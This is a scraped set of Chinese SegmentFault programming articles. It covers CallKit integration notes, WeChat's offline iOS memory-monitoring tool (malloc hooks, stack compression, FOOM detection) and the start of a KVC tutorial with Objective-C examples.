<li>当发起通话时，在使用 <code>CXStartCallAction</code> 向系统注册通话后，系统会启动应用的 AudioSession，并将其优先级提高到运营商通话的级别。如果应用在这个过程中自己对 AudioSession 进行设置操作，很可能会导致 AudioSession 启动失败。所以应用需要等系统启动 AudioSession 完成，在收到 <code>CXProviderDelegate</code> 的 <code>provider(_:didActive:)</code> 回调后，再进行 AudioSession 相关的设置。我们在 Demo 中是通过 Agora SDK 的 <code>disableAudio()</code> 和 <code>enableAudio()</code> 等接口来处理这部分逻辑的。</li>
<li>集成 CallKit 后，VoIP 来电也会和运营商电话一样受到用户系统 “勿扰” 等设置的影响。</li>
<li>在听筒模式下按锁屏键，系统会按照挂断处理。这个行为也和运营商电话一致。</li>
</ol>
<p>最后再次附上完整 Demo <a href=""https://github.com/AgoraIO/Agora-RTC-With-CallKit"" rel=""nofollow noreferrer"">Github 地址</a></p>

                ", 如何结合 CallKit 和 Agora SDK 实现视频 VoIP 通话应用,1531971890,279,1,475,1,1,https://segmentfault.com/a/1190000013585492
26,1,0,6,"
                    
<p><strong>作者：杨津，腾讯移动客户端开发 高级工程师</strong><br>商业转载请联系腾讯WeTest获得授权，非商业转载请注明出处。 <br><strong>原文链接：<a href=""http://wetest.qq.com/lab/view/367.html?from=content_SegmentFault"" rel=""nofollow noreferrer"">http://wetest.qq.com/lab/view/367.html</a></strong></p>
<h2><strong>WeTest 导读</strong></h2>
<p>目前iOS主流的内存监控工具是Instruments的Allocations，但只能用于开发阶段。本文介绍如何实现离线化的内存监控工具，用于App上线后发现内存问题。</p>
<hr>
<p>FOOM（Foreground Out Of Memory），是指App在前台因消耗内存过多引起系统强杀。对用户而言，表现跟crash一样。Facebook早在2015年8月提出FOOM检测办法，大致原理是排除各种情况后，剩余的情况是FOOM，具体链接：<a href=""https://code.facebook.com/posts/1146930688654547/reducing-fooms-in-the-facebook-ios-app/"" rel=""nofollow noreferrer"">https://code.facebook.com/posts/1146930688654547/reducing-fooms-in-the-facebook-ios-app/</a>。</p>
<p>微信自15年年底上线FOOM上报，从最初数据来看，每天FOOM次数与登录用户数比例接近3%，同期crash率1%不到。而16年年初某东老大反馈微信频繁闪退，在艰难拉取2G多日志后，才发现kv上报频繁打log引起FOOM。接着16年8月不少外部用户反馈微信启动不久后闪退，分析大量日志还是不能找到FOOM原因。微信急需一个有效的内存监控工具来发现问题。</p>
<h2><strong>一、实现原理</strong></h2>
<p>微信内存监控最初版本是使用Facebook的FBAllocationTracker工具监控OC对象分配，用fishhook工具hook malloc/free等接口监控堆内存分配，每隔1秒，把当前所有OC对象个数、TOP 200最大堆内存及其分配堆栈，用文本log输出到本地。该方案实现简单，一天内完成，通过给用户下发TestFlight，最终发现联系人模块因迁移DB加载大量联系人导致FOOM。</p>
<p><strong>不过这方案有不少缺点：</strong></p>
<p>1、监控粒度不够细，像大量分配小内存引起的质变无法监控，另外fishhook只能hook自身app的C接口调用，对系统库不起作用；</p>
<p>2、打log间隔不好控制，间隔过长可能丢失中间峰值情况，间隔过短会引起耗电、io频繁等性能问题；</p>
<p>3、上报的原始log靠人工分析，缺少好的页面工具展现和归类问题。</p>
<p>所以二期版本以Instruments的Allocations为参考，着重四个方面优化，分别是数据收集、存储、上报及展现。</p>
<blockquote><strong>1.数据收集</strong></blockquote>
<p>16年9月底为了解决ios10 nano crash，研究了libmalloc源码，无意中发现这几个接口：<br><span class=""img-wrap""><img data-src=""/img/bV4Jqh?w=800&amp;h=310"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>当malloc_logger和__syscall_logger函数指针不为空时，malloc/free、vm_allocate/vm_deallocate等内存分配/释放通过这两个指针通知上层，这也是内存调试工具malloc stack的实现原理。有了这两个函数指针，我们很容易记录当前存活对象的内存分配信息（包括分配大小和分配堆栈）。分配堆栈可以用backtrace函数捕获，但捕获到的地址是虚拟内存地址，不能从符号表dsym解析符号。所以还要记录每个image加载时的偏移slide，这样符号表地址=堆栈地址-slide。</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4JqW?w=800&amp;h=548"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>另外为了更好的归类数据，每个内存对象应该有它所属的分类Category，如上图所示。对于堆内存对象，它的Category名是“Malloc ”+分配大小，如“Malloc 48.00KiB”；对于虚拟内存对象，调用vm_allocate创建时，最后的参数flags代表它是哪类虚拟内存，而这个flags正对应于上述函数指针__syscall_logger的第一个参数type，每个flag具体含义可以在头文件&lt;mach/vm_statistics.h&gt;找到；对于OC对象，它的Category名是OC类名，我们可以通过hook OC方法+[NSObject alloc]来获取：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4Jri?w=800&amp;h=148"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>但后来发现，NSData创建对象的类静态方法没有调用+[NSObject alloc]，里面实现是调用C方法NSAllocateObject来创建对象，也就是说这类方式创建的OC对象无法通过hook来获取OC类名。最后在苹果开源代码CF-1153.18找到了答案，当__CFOASafe=true并且__CFObjectAllocSetLastAllocEventNameFunction!=NULL时，CoreFoundation创建对象后通过这个函数指针告诉上层当前对象是什么类型：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4JsK?w=800&amp;h=102"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>通过上面方式，我们的监控数据来源基本跟Allocations一样了，当然是借助了私有API。如果没有足够的“技巧”，私有API带不上Appstore，我们只能退而求其次。修改malloc_default_zone函数返回的malloc_zone_t结构体里的malloc、free等函数指针，也是可以监控堆内存分配，效果等同于malloc_logger；而虚拟内存分配只能通过fishhook方式。</p>
<blockquote><strong>2.数据存储</strong></blockquote>
<p><strong>存活对象管理</strong></p>
<p>APP在运行期间会大量申请/释放内存。以上图为例，微信启动10秒内，已经创建了80万对象，释放了50万，性能问题是个挑战。另外在存储过程中，也尽量减少内存申请/释放。所以放弃了sqlite，改用了更轻量级的平衡二叉树来存储。</p>
<p>伸展树（Splay Tree），也叫分裂树，是一种二叉排序树，不保证树是平衡，但各种操作平均时间复杂度是O(logN)，可近似看作平衡二叉树。相比其他平衡二叉树（如红黑树），其内存占用较小，不需要存储额外信息。伸展树主要出发点是考虑到局部性原理（某个刚被访问的结点下次又被访问，或者访问次数多的结点下次可能被访问），为了使整个查找时间更少，被频繁查询的结点通过“伸展”操作搬移到离树根更近的地方。大部分情况下，内存申请很快又被释放，如autoreleased对象、临时变量等；而OC对象申请内存后紧接着会更新它所属Category。所以用伸展树管理最适合不过了。</p>
<p>传统二叉树是用链表方式实现，每次添加/删除结点，都会申请/释放内存。为了减少内存操作，可以用数组实现二叉树。具体做法是父结点的左右孩子由以往的指针类型改成整数类型，代表孩子在数组的下标；删除结点时，被删除的结点存放上一个被释放的结点所在数组下标。</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4JtC?w=800&amp;h=406"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><strong>堆栈存储</strong></p>
<p>据统计，微信运行期间，backtrace的堆栈有成百万上千万种，在捕获最大栈长64情况下，平均栈长35。如果36bits存储一个地址（armv8最大虚拟内存地址48bits，实际上36bits够用了），一个堆栈平均存储长度157.5bytes，1M个堆栈需要157.5M存储空间。但通过断点观察，实际上大部分堆栈是有共同后缀，例如下面的两个堆栈后7个地址是一样的：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4Juq?w=800&amp;h=542"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>为此，可以用Hash Table来存储这些堆栈。思路是整个堆栈以链表的方式插入到table里，链表结点存放当前地址和上一个地址所在table的索引。每插入一个地址，先计算它的hash值，作为在table的索引，如果索引对应的slot没有存储数据，就记录这个链表结点；如果有存储数据，并且数据跟链表结点一致，hash命中，继续处理下一个地址；数据不一致，意味着hash冲突，需要重新计算hash值，直到满足存储条件。举个例子（简化了hash计算）：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4JuJ?w=800&amp;h=231"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>1）Stack1的G、F、E、D、C、A、依次插入到Hash Table，索引1～6结点数据依次是(G, 0)、(F, 1)、(E, 2)、(D, 3)、(C, 4)、(A, 5)。Stack1索引入口是6</p>
<p>2）轮到插入Stack2，由于G、F、E、D、C结点数据跟Stack1前5结点一致，hash命中；B插入新的7号位置，(B, 5)。Stack2索引入口是7</p>
<p>3）最后插入Stack3，G、F、E、D结点hash命中；但由于Stack3的A的上一个地址D索引是4，而不是已有的(A, 5)，hash不命中，查找下一个空白位置8，插入结点(A, 4)；B上一个地址A索引是8，而不是已有的(B, 5)，hash不命中，查找下一个空白位置9，插入结点(B, 9)。Stack3索引入口是9</p>
<p>经过这样的后缀压缩存储，平均栈长由原来的35缩短到5不到。而每个结点存储长度为64bits（36bits存储地址，28bits储存parent索引），hashTable空间利用率60%+，一个堆栈平均存储长度只需要66.7bytes，压缩率高达42%。</p>
<p><strong>性能数据</strong></p>
<p>经过上述优化，内存监控工具在iPhone6Plus运行占用CPU占用率13%不到，当然这是跟数据量有关，重度用户（如群过多、消息频繁等）可能占用率稍微偏高。而存储数据内存占用量20M左右，都用mmap方式把文件映射到内存。有关mmap好处可自行google之。</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4JvM?w=800&amp;h=117"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<blockquote><strong>3.数据上报</strong></blockquote>
<p>由于内存监控是存储了当前所有存活对象的内存分配信息，数据量极大，所以当出现FOOM时，不可能全量上报，而是按某些规则有选择性的上报。</p>
<p>首先把所有对象按Category进行归类，统计每个Category的对象数和分配内存大小。这列表数据很少，可以做全量上报。接着对Category下所有相同堆栈做合并，计算每种堆栈的对象数和内存大小。对于某些Category，如分配大小TOP N，或者UI相关的（如UIViewController、UIView之类的），它里面分配大小TOP M的堆栈才做上报。上报格式类似这样：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4Jwc?w=800&amp;h=356"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<blockquote><strong>4.页面展现</strong></blockquote>
<p>页面展现参考了Allocations，可看出有哪些Category，每个Category分配大小和对象数，某些Category还能看分配堆栈。<br><span class=""img-wrap""><img data-src=""/img/bV4JxS?w=800&amp;h=437"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>为了突出问题，提高解决问题效率，后台先根据规则找出可能引起FOOM的Category（如上面的Suspect Categories），规则有：</p>
<p>● UIViewController数量是否异常</p>
<p>● UIView数量是否异常</p>
<p>● UIImage数量是否异常</p>
<p>● 其它Category分配大小是否异常，对象个数是否异常</p>
<p>接着对可疑的Category计算特征值，也就是OOM原因。特征值是由“Caller1”、“Caller2”和“Category, Reason”组成。Caller1是指申请内存点，Caller2是指具体场景或业务，它们都是从Category下分配大小第一的堆栈提取。Caller1提取尽量是有意义的，并不是分配函数的上一地址。例如：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4JzP?w=800&amp;h=584"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>所有report计算出特征值后，可以对它们进行归类了。一级分类可以是Caller1，也可以是Category，二级分类是与Caller1/Category有关的特征聚合。效果如下：</p>
<p><strong>一级分类</strong><br><span class=""img-wrap""><img data-src=""/img/bV4JAe?w=800&amp;h=190"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><strong>二级分类</strong></p>
<p><span class=""img-wrap""><img data-src=""/img/bV4JDQ?w=800&amp;h=235"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<blockquote><strong>5.运营策略</strong></blockquote>
<p>上面提到，内存监控会带来一定的性能损耗，同时上报的数据量每次大概300K左右，全量上报对后台有一定压力，所以对现网用户做抽样开启，灰度包用户/公司内部用户/白名单用户做100%开启。本地最多只保留最近三次数据。</p>
<h2><strong>二、降低误判</strong></h2>
<p>先回顾Facebook如何判定上一次启动是否出现FOOM：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4JFB?w=736&amp;h=862"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>1.App没有升级</p>
<p>2.App没有调用exit()或abort()退出</p>
<p>3.App没有出现crash</p>
<p>4.用户没有强退App</p>
<p>5.系统没有升级/重启</p>
<p>6.App当时没有后台运行</p>
<p>7.App出现FOOM</p>
<p>1、2、4、5比较容易判断，3依赖于自身CrashReport组件的crash回调，6、7依赖于ApplicationState和前后台切换通知。<strong>微信自上线FOOM数据上报以来，出现不少误判，主要情况有：</strong></p>
<p><strong>ApplicationState不准</strong></p>
<p>部分系统会在后台短暂唤起app，ApplicationState是Active，但又不是BackgroundFetch；执行完didFinishLaunchingWithOptions就退出了，也有收到BecomeActive通知，但很快也退出；整个启动过程持续5～8秒不等。解决方法是收到BecomeActive通知一秒后，才认为这次启动是正常的前台启动。这方法只能减少误判概率，并不能彻底解决。</p>
<p><strong>群控类外挂</strong></p>
<p>这类外挂是可以远程控制iPhone的软件，通常一台电脑可以控制多台手机，电脑画面和手机屏幕实时同步操作，如开启微信，自动加好友，发朋友圈，强制退出微信，这一过程容易产生误判。解决方法只能通过安全后台打击才能减少这类误判。</p>
<p><strong>CrashReport组件出现crash没有回调上层</strong></p>
<p>微信曾经在17年5月底爆发大量GIF crash，该crash由内存越界引起，但收到crash信号写crashlog时，由于内存池损坏，组件无法正常写crashlog，甚至引起二次crash；上层也无法收到crash通知，因此误判为FOOM。目前改成不依赖crash回调，只要本地存在上一次crashlog（不管是否完整），就认为是crash引起的APP重启。</p>
<p><strong>前台卡死引起系统watchdog强杀</strong></p>
<p>也就是常见的0x8badf00d，通常原因是前台线程过多，死锁，或CPU使用率持续过高等，这类强杀无法被App捕获。为此我们结合了已有卡顿系统，当前台运行最后一刻有捕获到卡顿，我们认为这次启动是被watchdog强杀。同时我们从FOOM划分出新的重启原因叫“APP前台卡死导致重启”，列入重点关注。</p>
<h2><strong>三、成果</strong></h2>
<p>微信自2017年三月上线内存监控以来，解决了30多处大大小小内存问题，涉及到聊天、搜索、朋友圈等多个业务，FOOM率由17年年初3%，降到目前0.67%，而前台卡死率由0.6%下降到0.3%，效果特别明显。</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4JF0?w=800&amp;h=286"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br><span class=""img-wrap""><img data-src=""/img/bV4JHh?w=800&amp;h=286"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2><strong>四、常见问题</strong></h2>
<p><strong>UIGraphicsEndImageContext</strong></p>
<p>UIGraphicsBeginImageContext和UIGraphicsEndImageContext必须成双出现，不然会造成context泄漏。另外XCode的Analyze也能扫出这类问题。</p>
<p><strong>UIWebView</strong></p>
<p>无论是打开网页，还是执行一段简单的js代码，UIWebView都会占用APP大量内存。而WKWebView不仅有出色的渲染性能，而且它有自己独立进程，一些网页相关的内存消耗移到自身进程里，最适合取替UIWebView。</p>
<p><strong>autoreleasepool</strong></p>
<p>通常autoreleased对象是在runloop结束时才释放。如果在循环里产生大量autoreleased对象，内存峰值会猛涨，甚至出现OOM。适当的添加autoreleasepool能及时释放内存，降低峰值。</p>
<p><strong>互相引用</strong></p>
<p>比较容易出现互相引用的地方是block里使用了self，而self又持有这个block，只能通过代码规范来避免。另外NSTimer的target、CAAnimation的delegate，是对Obj强引用。目前微信通过自己实现的MMNoRetainTimer和MMDelegateCenter来规避这类问题。</p>
<p><strong>大图片处理</strong></p>
<p>举个例子，以往图片缩放接口是这样写的：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4JHA?w=800&amp;h=215"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>但处理大分辨率图片时，往往容易出现OOM，原因是-[UIImage drawInRect:]在绘制时，先解码图片，再生成原始分辨率大小的bitmap，这是很耗内存的。解决方法是使用更低层的ImageIO接口，避免中间bitmap产生：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4JIS?w=800&amp;h=469"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<hr>
<p><strong>大视图</strong></p>
<p>大视图是指View的size过大，自身包含要渲染的内容。超长文本是微信里常见的炸群消息，通常几千甚至几万行。如果把它绘制到同一个View里，那将会消耗大量内存，同时造成严重卡顿。最好做法是把文本划分成多个View绘制，利用TableView的复用机制，减少不必要的渲染和内存占用。</p>
<blockquote>
<h3>推荐文章</h3>
<p>最后推荐几个iOS内存相关的链接：</p>
<p>● <a href=""https://developer.apple.com/library/content/documentation/Performance/Conceptual/ManagingMemory/ManagingMemory.html#//apple_ref/doc/uid/10000160-SW1"" rel=""nofollow noreferrer"">Memory Usage Performance Guidelines</a></p>
<p>● <a href=""http://www.newosxbook.com/articles/MemoryPressure.html"" rel=""nofollow noreferrer"">No pressure, Mon!</a></p>
</blockquote>
<hr>
<p><strong>腾讯WeTest iOS预审工具</strong></p>
<p>为了提高IEG苹果审核通过率，腾讯专门成立了苹果审核测试团队，打造出iOS预审工具这款产品。经过1年半的内部运营，腾讯内部应用的iOS审核通过率从平均35%提升到90%+。</p>
<p>现将腾讯内部产品的过审经验，以线上工具的形式共享给各位。在WeTest腾讯质量开放平台上可以在线使用。<strong>点击 <a href=""http://wetest.qq.com/product/ios?from=content_SegmentFault"" rel=""nofollow noreferrer"">http://wetest.qq.com/product/ios</a> 即可立即体验！</strong></p>
<p>如果使用当中有任何疑问，欢迎联系腾讯WeTest企业QQ：800024531</p>
<hr>
<p><strong>iOS预审服务</strong></p>
<p><strong>【扫描工具】</strong>上传IPA包、图片、视频、应用描述即可进行测试； 多维度自动扫描提审材料的被拒风险；1小时内反馈全面的扫描报告。</p>
<p><strong>【专家预审】</strong>腾讯专家为您遍历App所有功能模块；全面暴露App内容被拒风险；跟进问题直至上线（需提供官方拒绝邮件）。</p>
<p><strong>【专家咨询】资</strong>深预审专家一对一服务； 咨询时间灵活可选，按需购买；有的放矢解 决审核问题。</p>
<p><strong>【ASO优化】</strong>专业团队多维度深度剖析App的ASO现状；围绕App目标用户群筛选高 度关联的关键词；帮助提升App在苹果应用商店中的曝光率。</p>

                ", iOS微信内存监控,1531971892,452,1,388,1,1,https://segmentfault.com/a/1190000013483231
27,1,0,6,"
                    
<h5>该文章属于&lt;简书 — 刘小壮&gt;原创，转载请注明：</h5>
<p><a href=""https://www.jianshu.com/p/1d39bc610a5b"" rel=""nofollow noreferrer"">&lt;简书 — 刘小壮&gt; https://www.jianshu.com/p/1d39bc610a5b</a></p>
<hr>
<blockquote>在工作中经常会使用到<code>KVC</code>，但是很多人对于<code>KVC</code>的实现原理并不太清楚。比如说<code>KVC</code>在进行存取时，是怎么进行查找并赋值的。<p>网上有很多讲<code>KVC</code>的文章，但是有很多质量并不高。这两天抽空把我所理解的<code>KVC</code>写出来，当做学习交流，正好也让各位大神帮我指正一下，十分感谢！</p>
</blockquote>
<hr>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013476168"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""博客配图"" title=""博客配图""></span></p>
<h3>协议定义</h3>
<p><code>KVC</code>全称是<code>Key Value Coding</code>，定义在<code>NSKeyValueCoding.h</code>文件中，是一个<a href=""https://www.jianshu.com/p/2113ffe54b30"" rel=""nofollow noreferrer"">非正式协议</a>。<code>KVC</code>提供了一种间接访问其属性方法或成员变量的机制，可以通过字符串来访问对应的属性方法或成员变量。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013476169"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""NSKeyValueCoding Protocol"" title=""NSKeyValueCoding Protocol""></span></p>
<p>在<code>NSKeyValueCoding</code>中提供了<code>KVC</code>通用的访问方法，分别是<code>getter</code>方法<code>valueForKey:</code>和<code>setter</code>方法<code>setValue:forKey:</code>，以及其衍生的<code>keyPath</code>方法，这两个方法各个类通用的。并且由<code>KVC</code>提供默认的实现，我们也可以自己重写对应的方法来改变实现。</p>
<h3>基础操作</h3>
<p><code>KVC</code>主要对三种类型进行操作，基础数据类型及常量、对象类型、集合类型。</p>
<pre><code class=""objc"">@interface BankAccount : NSObject
@property (nonatomic, strong) NSNumber *currentBalance;
@property (nonatomic, strong) Person *owner;
@property (nonatomic, strong) NSArray&lt;Transaction *&gt; *transactions;
@end</code></pre>
<p>在使用<code>KVC</code>时，直接将属性名当做<code>key</code>，并设置<code>value</code>，即可对属性进行赋值。</p>
<pre><code class=""objc"">[myAccount setValue:@(100.0) forKey:@""currentBalance""];</code></pre>
<h4>keyPath</h4>
<p><strong>除了对当前对象的属性进行赋值外，还可以对其更“深层”的对象进行赋值。</strong>例如对当前对象的<code>address</code>属性的<code>street</code>属性进行赋值。<code>KVC</code>进行多级访问时，直接类似于属性调用一样用点语法进行访问即可。</p>
<pre><code class=""objc"">[myAccount setValue:@""中关村大街"" forKeyPath:@""address.street""];</code></pre>
<p>通过<code>keyPath</code>对数组进行取值时，并且数组中存储的对象类型都相同，可以通过<code>valueForKeyPath:</code>方法指定取出数组中所有对象的某个字段。例如下面例子中，通过<code>valueForKeyPath:</code>将数组中所有对象的<code>name</code>属性值取出，并放入一个数组中返回。</p>
<pre><code class=""objc"">NSArray *names = [array valueForKeyPath:@""name""];</code></pre>
<h4>多值操作</h4>
<p>需要注意的是，虽然看到<code>dictionary</code>的字样，下面两个方法并不是字典的方法。</p>
<p><code>KVC</code>还有更强大的功能，可以根据给定的一组<code>key</code>，获取到一组<code>value</code>，并且以字典的形式返回，获取到字典后可以通过<code>key</code>从字典中获取到<code>value</code>。</p>
<pre><code class=""objc"">- (NSDictionary&lt;NSString *, id&gt; *)dictionaryWithValuesForKeys:(NSArray&lt;NSString *&gt; *)keys;</code></pre>
<p>同样，也可以通过<code>KVC</code>进行批量赋值。在对象调用<code>setValuesForKeysWithDictionary:</code>方法时，可以传入一个包含<code>key</code>、<code>value</code>的字典进去，<code>KVC</code>可以将所有数据按照属性名和字典的<code>key</code>进行匹配，并将<code>value</code>给<code>User</code>对象的属性赋值。</p>
<pre><code class=""objc"">- (void)setValuesForKeysWithDictionary:(NSDictionary&lt;NSString *, id&gt; *)keyedValues;</code></pre>
<h4>实用技巧</h4>
<p>在项目中经常会遇到字典转模型的情况，如果在自定义的<code>init</code>方法里逐个赋值，这样每次数据发生改变还需要改赋值语句。然而通过<code>KVC</code>为我们提供的赋值API，可以对数据进行批量赋值。假设有以下<code>JSON</code>数据并定义<code>User</code>类，在外界通过<code>setValuesForKeysWithDictionary:</code>方法对<code>User</code>进行赋值。</p>
<pre><code class=""objc"">JSON数据：
{
    ""username"": ""lxz"",
    ""age"": 25,
    ""id"": 100
}

@interface User : NSObject
@property (nonatomic, copy) NSString *name;
@property (nonatomic, assign) NSString age;
@property (nonatomic, assign) NSInteger userId;
@end

@implementation User
- (void)setValue:(id)value forUndefinedKey:(NSString *)key {
    if ([key isEqualToString:@""id""]) {
        self.userId = [value integerValue];
    }
}
@end</code></pre>
<p>赋值时会遇到一些问题，例如服务器会返回一个<code>id</code>字段，但是对于客户端来说<code>id</code>是系统保留字段，可以重写<code>setValue:forUndefinedKey:</code>方法并在内部处理<code>id</code>参数的赋值。</p>
<p>转换时需要服务器数据和类定义匹配，字段数量和字段名都应该匹配。如果<code>User</code>比服务器数据多，则服务器没传的字段为空。如果服务端传递的数据<code>User</code>中没有定义，则会导致崩溃。</p>
<p>在<code>KVC</code>进行属性赋值时，内部会对基础数据类型做处理，不需要手动做<code>NSNumber</code>的转换。需要注意的是，<code>NSArray</code>和<code>NSDictionary</code>等集合对象，<code>value</code>都不能是<code>nil</code>，否则会导致<code>Crash</code>。</p>
<h3>异常信息</h3>
<p>当根据<code>KVC</code>搜索规则，没有搜索到对应的<code>key</code>或者<code>keyPath</code>，则会调用对应的异常方法。异常方法的默认实现，在异常发生时会抛出一个<code>NSUndefinedKeyException</code>的异常，并且应用程序<code>Crash</code>。</p>
<p>我们可以重写下面两个方法，根据业务需求合理的处理<code>KVC</code>导致的异常。</p>
<pre><code class=""objc"">- (nullable id)valueForUndefinedKey:(NSString *)key;
- (void)setValue:(nullable id)value forUndefinedKey:(NSString *)key;</code></pre>
<h4>异常处理</h4>
<p>当通过<code>KVC</code>给某个非对象的属性赋值为<code>nil</code>时，此时<code>KVC</code>会调用属性所属对象的<code>setNilValueForKey:</code>方法，并抛出<code>NSInvalidArgumentException</code>的异常，并使应用程序<code>Crash</code>。</p>
<p>我们可以通过重写下面方法，在发生这种异常时进行处理。例如给<code>name</code>赋值为<code>nil</code>的时候，就可以重写<code>setNilValueForKey:</code>方法并表示<code>name</code>是空的。</p>
<pre><code class=""objc"">- (void)setNilValueForKey:(NSString *)key {
    if ([key isEqualToString:@""name""]) {
        [self setValue:@"""" forKey:@”age”];
    } else {
        [super setNilValueForKey:key];
    }
}</code></pre>
<h3>集合属性操作</h3>
<p>根据<code>KVO</code>的实现原理，是在运行时生成新的子类并重写其<code>setter</code>方法，在其内容发生改变时发送消息。但这只是对属性直接进行赋值会触发，如果属性是容器对象，对容器对象进行<code>add</code>或<code>remove</code>操作，则不会调用<code>KVO</code>的方法。可以通过<code>KVC</code>对应的<code>API</code>来配合使用，使容器对象内部发生改变时也能触发<code>KVO</code>。</p>
<p>在进行容器对象操作时，先调用下面方法通过<code>key</code>或者<code>keyPath</code>获取集合对象，然后再对容器对象进行<code>add</code>或<code>remove</code>等操作时，就会触发<code>KVO</code>的消息通知了。</p>
<pre><code class=""objc"">- (NSMutableArray *)mutableArrayValueForKey:(NSString *)key;
- (NSMutableOrderedSet *)mutableOrderedSetValueForKey:(NSString *)key API_AVAILABLE(macos(10.7), ios(5.0), watchos(2.0), tvos(9.0));
- (NSMutableSet *)mutableSetValueForKey:(NSString *)key;</code></pre>
<p>keyPath方法：</p>
<pre><code class=""objc"">- (NSMutableArray *)mutableArrayValueForKeyPath:(NSString *)keyPath;
- (NSMutableOrderedSet *)mutableOrderedSetValueForKeyPath:(NSString *)keyPath API_AVAILABLE(macos(10.7), ios(5.0), watchos(2.0), tvos(9.0));
- (NSMutableSet *)mutableSetValueForKeyPath:(NSString *)keyPath;</code></pre>
<h3>集合运算符</h3>
<p><code>KVC</code>提供的<code>valueForKeyPath:</code>方法非常强大，可以通过该方法对集合对象进行“深入”操作，在其<code>keyPath</code>中嵌套集合运算符，例如求一个数组中对象某个属性的<code>count</code>。(集合对象主要指<code>NSArray</code>和<code>NSSet</code>，但不包括<code>NSDictionary</code>)</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013476170"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""集合运算符格式"" title=""集合运算符格式""></span></p>
<p>上面表达式主要分为三部分，<code>left</code>部分是要操作的集合对象，如果调用<code>KVC</code>的对象本来就是集合对象，则<code>left</code>可以为空。中间部分是表达式，表达式一般以@符号开头。后面是进行运算的属性。</p>
<p>集合运算符主要分为三类：</p>
<ol>
<li>集合操作符：处理集合包含的对象，并根据操作符的不同返回不同的类型，返回值以<code>NSNumber</code>为主。</li>
<li>数组操作符：根据操作符的条件，将符合条件的对象包含在数组中返回。</li>
<li>嵌套操作符：处理集合对象中嵌套其他集合对象的情况，返回结果也是一个集合对象。</li>
</ol>
<h4>example</h4>
<p>下面是为了方便模拟<code>KVC</code>操作，而创建的测试代码。定义<code>Transaction</code>类为模型类，类中包含三种类型的属性。并定义<code>BankAccount</code>类，其中包含一个数组，下面的代码示例就都是操作这个数组的，并且数组包含所有<code>Transaction</code>对象。</p>
<pre><code class=""objc"">@interface Transaction : NSObject
@property (nonatomic, strong) NSString *payee;
@property (nonatomic, strong) NSNumber *amount;
@property (nonatomic, strong) NSDate *date;
@end</code></pre>
<pre><code class=""objc"">@interface BankAccount : NSObject
@property (nonatomic, strong) NSArray *transactions;
@end</code></pre>
<h4>集合操作符</h4>
<p>集合操作符处理<code>NSArray</code>和<code>NSSet</code>及其子类这样的集合对象，并根据不同的操作符返回不同类型的对象，返回值一般都是<code>NSNumber</code>。</p>
<ul><li>
<code>@avg</code>用来计算集合中<code>right keyPath</code>指定的属性的平均值。</li></ul>
<pre><code class=""objc"">NSNumber *transactionAverage = [self.transactions valueForKeyPath:@""@avg.amount""];</code></pre>
<ul><li>
<code>@count</code>用来计算集合的总数。</li></ul>
<pre><code class=""objc"">NSNumber *numberOfTransactions = [self.transactions valueForKeyPath:@""@count""];</code></pre>
<p>备注：<code>@count</code>操作符比较特殊，它不需要写<code>right keyPath</code>，即使写了也会被忽略。</p>
<ul><li>
<code>@sum</code>用来计算集合中<code>right keyPath</code>指定的属性的总和。</li></ul>
<pre><code class=""objc"">NSNumber *amountSum = [self.transactions valueForKeyPath:@""@sum.amount""];</code></pre>
<ul><li>
<code>@max</code>用来查找集合中<code>right keyPath</code>指定的属性的最大值。</li></ul>
